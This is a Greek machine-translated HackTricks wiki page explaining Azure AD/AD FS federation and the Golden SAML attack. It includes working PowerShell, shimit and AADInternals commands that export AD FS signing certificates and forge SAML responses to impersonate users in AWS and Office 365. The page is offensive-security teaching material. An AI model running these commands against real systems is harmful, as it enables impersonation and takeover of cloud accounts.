# Az - Federation

{% hint style="success" %}
Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## Βασικές Πληροφορίες

[Από τα έγγραφα:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federation** είναι μια συλλογή από **domains** που έχουν καθιερώσει **εμπιστοσύνη**. Το επίπεδο εμπιστοσύνης μπορεί να διαφέρει, αλλά συνήθως περιλαμβάνει **authentication** και σχεδόν πάντα περιλαμβάνει **authorization**. Μια τυπική ομοσπονδία μπορεί να περιλαμβάνει έναν **αριθμό οργανισμών** που έχουν καθιερώσει **εμπιστοσύνη** για **κοινή πρόσβαση** σε ένα σύνολο πόρων.

Μπορείτε να **ομοσπονδοποιήσετε το on-premises** περιβάλλον σας **με το Azure AD** και να χρησιμοποιήσετε αυτήν την ομοσπονδία για authentication και authorization. Αυτή η μέθοδος σύνδεσης διασφαλίζει ότι όλη η **authentication** των χρηστών γίνεται on-premises. Αυτή η μέθοδος επιτρέπει στους διαχειριστές να εφαρμόσουν πιο αυστηρά επίπεδα ελέγχου πρόσβασης. Η ομοσπονδία με **AD FS** και PingFederate είναι διαθέσιμη.

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

Βασικά, στην ομοσπονδία, όλη η **authentication** γίνεται στο **on-prem** περιβάλλον και ο χρήστης βιώνει SSO σε όλα τα αξιόπιστα περιβάλλοντα. Επομένως, οι χρήστες μπορούν να **προσπελάσουν** **cloud** εφαρμογές χρησιμοποιώντας τα **on-prem credentials** τους.

**Security Assertion Markup Language (SAML)** χρησιμοποιείται για την **ανταλλαγή** όλων των πληροφοριών authentication και authorization μεταξύ των παρόχων.

Σε οποιαδήποτε ρύθμιση ομοσπονδίας υπάρχουν τρία μέρη:

* Χρήστης ή Πελάτης
* Identity Provider (IdP)
* Service Provider (SP)

(Εικόνες από https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. Αρχικά, μια εφαρμογή (Service Provider ή SP, όπως η AWS κονσόλα ή ο vSphere web client) προσπελάζεται από έναν χρήστη. Αυτό το βήμα μπορεί να παρακαμφθεί, οδηγώντας τον πελάτη απευθείας στον IdP (Identity Provider) ανάλογα με την συγκεκριμένη υλοποίηση.
2. Στη συνέχεια, ο SP αναγνωρίζει τον κατάλληλο IdP (π.χ., AD FS, Okta) για την authentication του χρήστη. Στη συνέχεια, δημιουργεί ένα SAML (Security Assertion Markup Language) AuthnRequest και ανακατευθύνει τον πελάτη στον επιλεγμένο IdP.
3. Ο IdP αναλαμβάνει, πραγματοποιώντας την authentication του χρήστη. Μετά την authentication, ο IdP διαμορφώνει ένα SAMLResponse και το προωθεί στον SP μέσω του χρήστη.
4. Τέλος, ο SP αξιολογεί το SAMLResponse. Εάν επικυρωθεί επιτυχώς, υποδηλώνοντας μια σχέση εμπιστοσύνης με τον IdP, ο χρήστης αποκτά πρόσβαση. Αυτό σηματοδοτεί την ολοκλήρωση της διαδικασίας σύνδεσης, επιτρέποντας στον χρήστη να χρησιμοποιήσει την υπηρεσία.

**Εάν θέλετε να μάθετε περισσότερα για την authentication SAML και τις κοινές επιθέσεις, επισκεφθείτε:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* Το AD FS είναι ένα μοντέλο ταυτότητας βασισμένο σε claims.
* "..οι claims είναι απλά δηλώσεις (για παράδειγμα, όνομα, ταυτότητα, ομάδα), που γίνονται για τους χρήστες, οι οποίες χρησιμοποιούνται κυρίως για την εξουσιοδότηση πρόσβασης σε εφαρμογές βασισμένες σε claims που βρίσκονται οπουδήποτε στο Διαδίκτυο."
* Οι claims για έναν χρήστη γράφονται μέσα στα SAML tokens και στη συνέχεια υπογράφονται για να παρέχουν εμπιστευτικότητα από τον IdP.
* Ένας χρήστης αναγνωρίζεται από το ImmutableID. Είναι παγκοσμίως μοναδικό και αποθηκεύεται στο Azure AD.
* Το ImmutableID αποθηκεύεται on-prem ως ms-DS-ConsistencyGuid για τον χρήστη και/ή μπορεί να προκύψει από το GUID του χρήστη.
* Περισσότερες πληροφορίες στο [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAML attack:**

* Στο ADFS, το SAML Response υπογράφεται από ένα πιστοποιητικό υπογραφής token.
* Εάν το πιστοποιητικό παραβιαστεί, είναι δυνατό να γίνει authentication στο Azure AD ως ΟΠΟΙΟΣΔΗΠΟΤΕ χρήστης συγχρονισμένος με το Azure AD!
* Όπως και στην κατάχρηση PTA, η αλλαγή κωδικού πρόσβασης για έναν χρήστη ή το MFA δεν θα έχει καμία επίδραση επειδή παραποιούμε την απόκριση authentication.
* Το πιστοποιητικό μπορεί να εξαχθεί από τον διακομιστή AD FS με προνόμια DA και στη συνέχεια να χρησιμοποιηθεί από οποιοδήποτε μηχάνημα συνδεδεμένο στο διαδίκτυο.
* Περισσότερες πληροφορίες στο [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

Η διαδικασία όπου ένας **Identity Provider (IdP)** παράγει ένα **SAMLResponse** για να εξουσιοδοτήσει την είσοδο του χρήστη είναι υψίστης σημασίας. Ανάλογα με την συγκεκριμένη υλοποίηση του IdP, η **απόκριση** μπορεί να είναι **υπογεγραμμένη** ή **κρυπτογραφημένη** χρησιμοποιώντας το **ιδιωτικό κλειδί** του IdP. Αυτή η διαδικασία επιτρέπει στον **Service Provider (SP)** να επιβεβαιώσει την αυθεντικότητα του SAMLResponse, διασφαλίζοντας ότι εκδόθηκε πράγματι από έναν αξιόπιστο IdP.

Μπορεί να γίνει παραλληλισμός με την [επίθεση golden ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket), όπου το κλειδί που πιστοποιεί την ταυτότητα και τα δικαιώματα του χρήστη (KRBTGT για golden tickets, ιδιωτικό κλειδί υπογραφής token για golden SAML) μπορεί να παραποιηθεί για να **δημιουργηθεί ένα αντικείμενο authentication** (TGT ή SAMLResponse). Αυτό επιτρέπει την πλαστοπροσωπία οποιουδήποτε χρήστη, παρέχοντας μη εξουσιοδοτημένη πρόσβαση στον SP.

Τα Golden SAMLs προσφέρουν ορισμένα πλεονεκτήματα:

* Μπορούν να **δημιουργηθούν απομακρυσμένα**, χωρίς την ανάγκη να είναι μέρος του domain ή της ομοσπονδίας.
* Παραμένουν αποτελεσματικά ακόμα και με **Two-Factor Authentication (2FA)** ενεργοποιημένο.
* Το ιδιωτικό κλειδί υπογραφής **δεν ανανεώνεται αυτόματα**.
* **Η αλλαγή κωδικού πρόσβασης ενός χρήστη δεν ακυρώνει** ένα ήδη δημιουργημένο SAML.

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) είναι μια υπηρεσία της Microsoft που διευκολύνει την **ασφαλή ανταλλαγή πληροφοριών ταυτότητας** μεταξύ αξιόπιστων επιχειρηματικών εταίρων (ομοσπονδία). Ουσιαστικά επιτρέπει σε μια υπηρεσία domain να μοιράζεται ταυτότητες χρηστών με άλλους παρόχους υπηρεσιών εντός μιας ομοσπονδίας.

Με το AWS να εμπιστεύεται το παραβιασμένο domain (σε μια ομοσπονδία), αυτή η ευπάθεια μπορεί να εκμεταλλευτεί για να αποκτήσει **οποιαδήποτε δικαιώματα στο περιβάλλον AWS**. Η επίθεση απαιτεί το **ιδιωτικό κλειδί που χρησιμοποιείται για την υπογραφή των SAML αντικειμένων**, παρόμοια με την ανάγκη του KRBTGT σε μια επίθεση golden ticket. Η πρόσβαση στον λογαριασμό χρήστη AD FS είναι αρκετή για να αποκτηθεί αυτό το ιδιωτικό κλειδί.

Οι απαιτήσεις για την εκτέλεση μιας επίθεσης golden SAML περιλαμβάνουν:

* **Ιδιωτικό κλειδί υπογραφής token**
* **Δημόσιο πιστοποιητικό IdP**
* **Όνομα IdP**
* **Όνομα ρόλου (ρόλος που θα αναληφθεί)**
* Domain\username
* Όνομα συνεδρίας ρόλου στο AWS
* Amazon account ID

_Μόνο τα στοιχεία με έντονη γραφή είναι υποχρεωτικά. Τα υπόλοιπα μπορούν να συμπληρωθούν κατά βούληση._

Για να αποκτήσετε το **ιδιωτικό κλειδί**, είναι απαραίτητη η πρόσβαση στον **λογαριασμό χρήστη AD FS**. Από εκεί, το ιδιωτικό κλειδί μπορεί να **εξαχθεί από το προσωπικό κατάστημα** χρησιμοποιώντας εργαλεία όπως το [mimikatz](https://github.com/gentilkiwi/mimikatz). Για να συγκεντρώσετε τις άλλες απαιτούμενες πληροφορίες, μπορείτε να χρησιμοποιήσετε το Microsoft.Adfs.Powershell snapin ως εξής, διασφαλίζοντας ότι είστε συνδεδεμένοι ως ο χρήστης ADFS:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
Με όλες τις πληροφορίες, είναι δυνατό να ξεχάσετε μια έγκυρη SAMLResponse ως ο χρήστης που θέλετε να υποδυθείτε χρησιμοποιώντας [**shimit**](https://github.com/cyberark/shimit)**:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### On-prem -> cloud
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
Είναι επίσης δυνατό να δημιουργήσετε ImmutableID για χρήστες μόνο στο cloud και να τους υποδυθείτε
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## Αναφορές

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}
